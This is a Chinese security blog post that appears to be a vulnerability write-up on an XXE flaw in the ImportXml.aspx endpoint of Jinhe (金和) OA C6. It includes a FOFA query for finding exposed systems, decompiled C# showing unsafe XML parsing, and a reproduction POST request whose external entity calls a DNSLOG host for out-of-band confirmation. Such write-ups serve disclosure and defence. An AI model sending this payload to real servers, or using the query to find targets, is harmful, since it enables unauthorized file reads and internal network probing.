---
title: "金和OA ImportXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ImportXml-xxe.html
asset_dir: assets/金和oa-importxml.aspx-xxe漏洞
---

# 金和OA ImportXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/27 13:31
- 428浏览
- [0评论](#comment)
- 10分钟阅读

深入探索

Windows安全工具

软件

防火墙软件

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ImportXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ImportXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **ImportXml** 的处理逻辑

深入探索

传输层安全性协议

恶意软件分析工具

安全

```
protected void Page_Load(object sender, EventArgs e)
{
  Stream inputStream = this.Request.InputStream;
  byte[] numArray = new byte[(int) inputStream.Length];
  inputStream.Read(numArray, 0, numArray.Length);
  inputStream.Close();
  this.m_UserDs = this.m_Appraise.GetAllUserInfo();
  string xml = Encoding.UTF8.GetString(numArray);
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(xml);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/Jhsoft.Web.Appraise/ImportXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

服务器安全服务

编码转换工具

编程语言教程

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA ImportXml.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
